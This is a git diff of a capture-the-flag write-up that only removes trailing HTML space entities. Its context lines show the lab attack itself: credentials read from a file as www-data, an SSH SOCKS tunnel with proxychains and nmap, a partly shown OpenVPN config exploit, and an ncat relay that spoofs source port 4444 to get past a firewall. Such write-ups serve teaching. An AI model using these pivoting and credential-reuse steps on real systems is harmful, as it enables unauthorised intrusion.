@@ -129,7 +129,7 @@ www-data@ubuntu:/home/dave/Desktop$ cat key
 itscominghome
 ```
 
-Understanding that we have SSH credentials, we can do some port forwarding with this.&#x20;
+Understanding that we have SSH credentials, we can do some port forwarding with this.
 
 ```bash
 ssh -f -N -D 1080 dave@sparklays.com
@@ -139,7 +139,7 @@ Then, we can begin to scan both of these machines with `nmap`. Scanning the firs
 
 <figure><img src="../../../.gitbook/assets/image (2105).png" alt=""><figcaption></figcaption></figure>
 
-We can take a look at this using a browser with proxychains configured.&#x20;
+We can take a look at this using a browser with proxychains configured.
 
 ### DNS Server
 
@@ -155,7 +155,7 @@ Googling around for possible exploits reveals that it is possible for us to gain
 
 <figure><img src="../../../.gitbook/assets/image (2390).png" alt=""><figcaption></figcaption></figure>
 
-Then, we can input the following file and run Test VPN.&#x20;
+Then, we can input the following file and run Test VPN.
 
 ```
 remote 192.168.122.1
@@ -242,7 +242,7 @@ PORT     STATE  SERVICE
 4444/tcp closed krb524
 ```
 
-Interesting that port 4444 was open. So we can only detect port 987 should our source port be 4444.&#x20;
+Interesting that port 4444 was open. So we can only detect port 987 should our source port be 4444.
 
 The solution in this case is to open a random port via `ncat` that would listen to the connection between port 4444 and 987.
 
@@ -250,7 +250,7 @@ The solution in this case is to open a random port via `ncat` that would listen 
 /usr/bin/ncat -l 3333 --sh-exec "ncat -p 4444 192.168.5.2 987"
 ```
 
-The logs revealed that this could potentially be an SSH service for `dave`, so I tried just that and it worked! The same credentials for `dave` on the DNS server were used.&#x20;
+The logs revealed that this could potentially be an SSH service for `dave`, so I tried just that and it worked! The same credentials for `dave` on the DNS server were used.
 
 <figure><img src="../../../.gitbook/assets/image (3316).png" alt=""><figcaption></figcaption></figure>
 
